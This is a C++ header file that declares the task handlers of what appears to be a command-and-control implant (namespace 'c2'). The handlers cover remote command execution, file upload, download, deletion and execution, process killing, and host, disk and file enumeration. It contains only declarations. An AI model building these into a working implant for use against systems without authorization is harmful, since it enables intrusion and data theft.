/*
 * Copyright (c) 2021.  https://github.com/geemion
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#ifndef BODY_CMD_EXEC_H
#define BODY_CMD_EXEC_H
#include <stdio.h>
#include <vector>
#include <string>
#include "taskdata.pb.h"

namespace exec {

	bool format_error_msg(const int msg_id, c2::TaskData& task, std::vector<char>& msg_rsp);

	bool format_error_msg(const int msg_id, std::string error, c2::TaskData& task, std::vector<char>& msg_rsp);

	bool set_rsp_data(const int msg_id, c2::TaskData& task, const std::vector<char>& data, std::vector<char>& msg_rsp);

	//fix utf-8 all string data
	bool get_host_info(std::vector<char>& host_info);

	bool task_get_host_info(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_kill_process(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_get_process_list(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_get_disk_list(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_get_file_list(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_get_cmd_rsp(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_download_file(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_upload_file(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_delete_file(c2::TaskData& task, std::vector<char>& msg_rsp);

	bool task_exec_file(c2::TaskData& task, std::vector<char>& msg_rsp);
}

#endif //BODY_CMD_EXEC_H
